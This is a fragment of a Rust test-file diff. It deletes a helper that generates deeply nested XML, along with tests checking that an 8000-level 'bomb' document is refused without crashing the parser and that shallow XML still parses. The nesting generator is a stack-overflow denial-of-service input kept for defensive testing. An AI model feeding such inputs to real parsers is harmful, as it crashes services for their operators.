     assert!(evaluate_kv(&cond, &ctx).is_none());
-}
-
-fn nested_xml(depth: usize) -> String {
-    let mut xml = String::with_capacity(depth * 8 + 16);
-    xml.push_str("<root>");
-    for _ in 0..depth {
-        xml.push_str("<g>");
-    }
-    for _ in 0..depth {
-        xml.push_str("</g>");
-    }
-    xml.push_str("</root>");
-    xml
-}
-
-/// A deeply nested XML document must be refused before parsing, not crash
-/// the analyzer. roxmltree's recursive-descent parser overflows the native
-/// stack on such input, so a malicious SVG/plist/manifest with thousands of
-/// nested elements was a stack-overflow DoS (SIGSEGV) before the pre-scan
-/// guard. Without the fix this test aborts the process with a stack overflow.
-#[test]
-fn test_xml_deeply_nested_is_refused_not_crash() {
-    // Far deeper than MAX_XML_DEPTH and deep enough to overflow a default
-    // test-thread stack if it ever reached roxmltree.
-    let xml = nested_xml(8000);
-    let path = Path::new("bomb.xml");
-    assert!(
-        parse_structured_content(path, xml.as_bytes()).is_none(),
-        "over-deep XML must be refused, not parsed",
-    );
-}
-
-/// Legitimately shallow XML must still parse — the guard must not reject
-/// the everyday config documents trait authors query.
-#[test]
-fn test_xml_shallow_still_parses() {
-    let xml = nested_xml(MAX_XML_DEPTH / 4);
-    let path = Path::new("config.xml");
-    assert!(
-        parse_structured_content(path, xml.as_bytes()).is_some(),
-        "shallow XML within the depth bound must still parse",
-    );
 }
